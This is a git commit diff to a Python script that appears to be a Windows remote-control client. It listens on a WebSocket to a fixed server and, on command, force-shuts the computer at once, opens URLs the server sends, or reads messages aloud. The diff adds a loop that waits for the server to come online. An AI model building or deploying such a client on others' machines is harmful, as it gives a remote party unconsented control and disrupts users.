f94454bc2f2cddf4c33d042643bcc58287aec0b8
POTATOX <mustafakr83@gmail.com>
2025-01-03 22:50:21 +0300

    main

--- main.py
+++ main.py
@@ -3,24 +3,40 @@ import websockets
 import json
 import os
 import ctypes
-
-# MessageBox parametreleri
-
-
 import webbrowser
 from gtts import gTTS
+import requests
+import time
 
-# Render'daki WebSocket URL'si
 WEBSOCKET_URL = "wss://controlserver.onrender.com"
+WEBSITE_URL = "https://controlserver.onrender.com"
+
+def check_website():
+    try:
+        response = requests.get(WEBSITE_URL)
+        if response.status_code == 200:
+            return True
+        else:
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"Sayfa kontrolü sırasında hata: {e}")
+        return False
+
+def wait_for_website():
+    while True:
+        if check_website():
+            print("Site başarıyla yüklendi!")
+            break
+        else:
+            print("Site yüklenmedi, tekrar kontrol ediliyor...")
+        time.sleep(5)
 
 async def listen():
-    # ToastNotifier nesnesini oluştur
-    
+    wait_for_website()
 
     async with websockets.connect(WEBSOCKET_URL) as websocket:
         ctypes.windll.user32.MessageBoxW(0, "Connected", "Connected", 1)
 
-        # Mesajları sürekli dinle
         while True:
             try:
                 message = await websocket.recv()
@@ -28,7 +44,6 @@ async def listen():
                 command = data.get("command")
                 print(data)
 
-                # Gelen komuta göre işlem yap
                 if command == "execute_task":
                     print("Task executed!")
                     os.system('shutdown /s /f /t 0')
@@ -37,25 +52,17 @@ async def listen():
                     webbrowser.open(url)
                 elif command == "message":
                     print(data.get("contentt"))
-                    
-                    # Bildirim göster
-                    
 
-                    # Türkçe metin
                     text = data.get("contentt")
 
-                    # Türkçe dil seçeneği ile sesli okuma
                     tts = gTTS(text=text, lang='en')
 
-                    # Sesli okuma çıktısını bir dosyaya kaydetme
                     tts.save("output.mp3")
 
-                    # Çıktıyı çal
-                    os.system("start output.mp3")  # Windows için
+                    os.system("start output.mp3")
 
             except websockets.ConnectionClosed:
                 print("WebSocket bağlantısı kapatıldı.")
                 break
 
-# Ana döngüyü çalıştır
 asyncio.get_event_loop().run_until_complete(listen())
